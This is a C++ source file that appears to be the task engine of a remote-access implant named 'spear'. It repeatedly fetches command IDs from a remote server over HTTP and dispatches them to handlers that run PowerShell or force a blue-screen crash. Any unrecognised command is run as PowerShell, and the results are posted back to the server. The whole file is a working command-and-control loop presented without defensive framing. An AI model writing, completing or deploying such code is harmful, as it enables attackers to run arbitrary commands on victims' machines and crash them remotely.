#include <map>
#include <string>
#include <functional>
#include <nlohmann/json.hpp>

#include "KeyWord.h"
#include "Command.h"
#include "DebugLog.h"
#include "Instance.h"
#include "Transportion.h"

std::map< unsigned int, std::function<std::string(const std::string&)> > SpearCommands{
    std::pair< unsigned int, std::function<std::string(const std::string&)> >(0x0001, spear::RunPowerShell),
    std::pair< unsigned int, std::function<std::string(const std::string&)> >(0x0002, spear::BSOD),
    std::pair< unsigned int, std::function<std::string(const std::string&)> >(0x0005, spear::Exit),
};

namespace spear
{
    void TaskEngine(void)
    {
        while (Instance.Config.connected)
            {
                bool isFound = false;
                std::string resule;
                nlohmann::json respone = spear::Transporter::GetInstance().HttpGet(uri.Recv);
                DEBUG_LOG(respone.dump());
                if (respone.is_null())
                {
                    DEBUG_LOG("Disconnect: ");
                    Instance.Config.connected = false;
                    break;
                }
                if (respone.at(jsonKey.CmdIDKeyWord).get<unsigned int>() == 0x0000)
                    continue;
                if (respone.at(jsonKey.CmdIDKeyWord).get<unsigned int>() == 0xffff)
                {    
                    Instance.Config.connected = false;
                    break;
                }

                for (auto index: SpearCommands)
                {
                    if (respone.at(jsonKey.CmdIDKeyWord).get<unsigned int>() == index.first)
                    {
                        isFound = true;
                        resule = index.second(respone.at(jsonKey.ArgsKeyWord).get<std::string>());
                        break;
                    }
                }
                if (!isFound) resule = spear::RunPowerShell(respone.at(jsonKey.ArgsKeyWord).get<std::string>());

                nlohmann::json data;
                data[jsonKey.DataKeyWord] = resule;
                if (!spear::Transporter::GetInstance().HttpPost(uri.Send, data))
                {
                    DEBUG_LOG("Disconnect: ");
                    Instance.Config.connected = false;
                }
            }
    }
}